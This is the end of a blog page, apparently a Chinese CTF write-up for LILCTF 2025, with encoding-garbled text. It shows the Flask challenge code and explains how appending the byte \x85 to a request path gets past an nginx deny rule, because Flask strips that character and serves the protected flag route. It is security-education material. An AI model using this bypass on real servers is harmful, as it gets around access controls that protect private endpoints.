</h2><h3 id="è€ƒç‚¹åˆ©ç”¨flaskçš„urlåˆ é™¤å­—ç¬¦æ€§è´¨ç»•è¿‡nginxçš„deny">è€ƒç‚¹ï¼šåˆ©ç”¨flaskçš„urlåˆ é™¤å­—ç¬¦æ€§è´¨ç»•è¿‡nginxçš„deny
</h3><p>çœ‹ä»£ç è®¿é—®/srcretå°±å¯ä»¥æ‹¿flagï¼Œä½†æ˜¯è®¿é—®å´403</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># pylint: disable=missing-module-docstring,missing-function-docstring</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&lt;h1&gt;Hello, CTFer!&lt;/h1&gt;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/secret&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">secret</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;LILCTF_FLAG&#34;</span><span class="p">,</span> <span class="s2">&#34;LILCTF</span><span class="si">{default}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="mi">8080</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="link" href="https://github.com/dub-flow/path-normalization-bypasses"  target="_blank" rel="noopener"
    >https://github.com/dub-flow/path-normalization-bypasses</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ç»•è¿‡åŸç†ï¼š
</span></span><span class="line"><span class="cl">Nginx çœ‹åˆ°è·¯å¾„æ˜¯ /admin\x85
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">å› ä¸º Nginx ä¸ä¼šè‡ªåŠ¨å»é™¤ \x85ï¼Œå®ƒè®¤ä¸ºè¿™ä¸æ˜¯ /adminï¼Œæ‰€ä»¥ä¸è§¦å‘ deny all;
</span></span><span class="line"><span class="cl">è¯·æ±‚è¢«è½¬å‘ç»™åç«¯ Flask
</span></span><span class="line"><span class="cl">Flask æ”¶åˆ°è·¯å¾„ /admin\x85
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Flask å†…éƒ¨ä½¿ç”¨ Python çš„ WSGI è§£æè·¯å¾„ï¼Œä¼šè‡ªåŠ¨å»é™¤æŸäº›æ§åˆ¶å­—ç¬¦ï¼ˆåŒ…æ‹¬ \x85, \xa0 ç­‰ï¼‰
</span></span><span class="line"><span class="cl">å®é™…è·¯ç”±åŒ¹é…ä¸º /adminè¿”å› 200 OK å’Œ flag
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥åŒºbpä¸ŠåŠ ä¸Šä¸€ä¸ªå­—èŠ‚85å°±è¡Œ</p>
<p><img src="/p/2025-lilctf/image-20250909101202359.png"
	width="1235"
	height="363"
	srcset="/p/2025-lilctf/image-20250909101202359_hu_c0293d1f41f70855.png 480w, /p/2025-lilctf/image-20250909101202359_hu_d8a96fe1ec38c4ea.png 1024w"
	loading="lazy"
	
		alt="image-20250909101202359"
	
	
		class="gallery-image" 
		data-flex-grow="340"
		data-flex-basis="816px"
	
></p>
<p><img src="/p/2025-lilctf/image-20250909101224130.png"
	width="1115"
	height="230"
	srcset="/p/2025-lilctf/image-20250909101224130_hu_242ddb2a37eaf882.png 480w, /p/2025-lilctf/image-20250909101224130_hu_64f3caf7c65b29f5.png 1024w"
	loading="lazy"
	
		alt="image-20250909101224130"
	
	
		class="gallery-image" 
		data-flex-grow="484"
		data-flex-basis="1163px"
	
></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/emo/">Emo</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>è°¢è°¢è§‚çœ‹</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/2025-%E6%98%A5%E7%A7%8B%E9%95%BF%E5%9F%8E%E6%9D%AF/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-æ˜¥ç§‹é•¿åŸæ¯</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025n1ctf/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025N1CTF</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-%E6%B9%BE%E5%8C%BA%E6%9D%AF/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-æ¹¾åŒºæ¯</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-%E5%87%BA%E9%A2%98/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-å‡ºé¢˜</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-nss-4th/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-Nss-4th</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo=""
        issue-term="pathname"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 luokaihong
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
